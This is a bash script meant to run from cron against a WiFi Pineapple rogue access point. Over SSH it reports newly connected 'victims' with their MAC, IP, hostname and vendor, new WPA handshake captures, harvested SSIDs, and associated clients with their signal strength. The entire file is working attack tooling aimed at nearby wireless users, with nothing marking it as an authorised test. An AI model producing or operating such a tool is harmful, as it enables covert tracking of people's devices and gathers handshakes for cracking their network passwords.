#!/bin/bash
# Pineapple Client Monitor — polls for new victims, handshakes, SSIDs
# Run as cron job; outputs only when new findings exist
# Usage: bash pineapple-monitor.sh

STATE_FILE="/root/.pineapple_state"
PINEAPPLE="172.16.42.1"
SSH_KEY="/root/.ssh/id_ed25519"
SSH="ssh -i $SSH_KEY -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@$PINEAPPLE"

NOW=$(date +%s)
[ ! -f "$STATE_FILE" ] && touch "$STATE_FILE"

# --- 1. New DHCP leases (new victims) ---
LEASES=$($SSH "cat /tmp/dhcp.leases 2>/dev/null" 2>/dev/null)
while IFS= read -r line; do
    [ -z "$line" ] && continue
    MAC=$(echo "$line" | awk '{print $2}')
    IP=$(echo "$line" | awk '{print $3}')
    HOST=$(echo "$line" | awk '{print $4}')
    [[ "$MAC" == "00:13:37:a7:85:52" ]] && continue  # skip Kali
    FINGERPRINT="${MAC}|${IP}|${HOST}"
    if ! grep -qF "$FINGERPRINT" "$STATE_FILE"; then
        echo "$FINGERPRINT" >> "$STATE_FILE"
        VENDOR=$($SSH "grep -i '${MAC:0:8}' /etc/pineapple/ouis 2>/dev/null | head -1" 2>/dev/null)
        echo "🔴 NEW VICTIM CONNECTED: $MAC ($IP) — $HOST — ${VENDOR:-unknown vendor}"
    fi
done <<< "$LEASES"

# --- 2. New WPA handshakes ---
HANDSHAKES=$($SSH "find /root/handshakes/ -name '*.pcap' -newer /root/handshakes/README 2>/dev/null" 2>/dev/null)
while IFS= read -r hfile; do
    [ -z "$hfile" ] && continue
    HFINGERPRINT="handshake|${hfile}"
    if ! grep -qF "$HFINGERPRINT" "$STATE_FILE"; then
        echo "$HFINGERPRINT" >> "$STATE_FILE"
        HSIZE=$($SSH "ls -lh '$hfile' 2>/dev/null | awk '{print \$5}'" 2>/dev/null)
        echo "🔑 NEW HANDSHAKE CAPTURED: $hfile ($HSIZE)"
    fi
done <<< "$HANDSHAKES"

# --- 3. New captured SSIDs ---
SSIDS=$($SSH "sqlite3 /etc/pineapple/pineapple.db 'SELECT ssid FROM ssids ORDER BY rowid DESC LIMIT 20;' 2>/dev/null" 2>/dev/null)
while IFS= read -r ssid; do
    [ -z "$ssid" ] && continue
    [[ "$ssid" == "linksys" || "$ssid" == "Ghossein" ]] && continue
    SFINGERPRINT="ssid|${ssid}"
    if ! grep -qF "$SFINGERPRINT" "$STATE_FILE"; then
        echo "$SFINGERPRINT" >> "$STATE_FILE"
        echo "📡 NEW SSID CAPTURED: $ssid"
    fi
done <<< "$SSIDS"

# --- 4. Connected clients ---
CLIENTS=$($SSH "iw dev wlan0 station dump 2>/dev/null | grep '^Station' | awk '{print \$2}'" 2>/dev/null)
while IFS= read -r client_mac; do
    [ -z "$client_mac" ] && continue
    [[ "$client_mac" == "00:13:37:a7:85:52" ]] && continue
    if ! grep -q "client|${client_mac}" "$STATE_FILE"; then
        echo "client|${client_mac}|${NOW}" >> "$STATE_FILE"
        SIGNAL=$($SSH "iw dev wlan0 station get $client_mac 2>/dev/null | grep 'signal:' | awk '{print \$2}'" 2>/dev/null)
        echo "📶 CLIENT ASSOCIATED: $client_mac — signal: ${SIGNAL:-?} dBm"
    fi
done <<< "$CLIENTS"

# Cleanup old client entries (>24h)
grep -v "^client|" "$STATE_FILE" > "${STATE_FILE}.tmp" 2>/dev/null
grep "^client|" "$STATE_FILE" | while IFS= read -r cline; do
    CTIME=$(echo "$cline" | awk -F'|' '{print $3}')
    [ $((NOW - CTIME)) -lt 86400 ] && echo "$cline" >> "${STATE_FILE}.tmp"
done
mv "${STATE_FILE}.tmp" "$STATE_FILE"
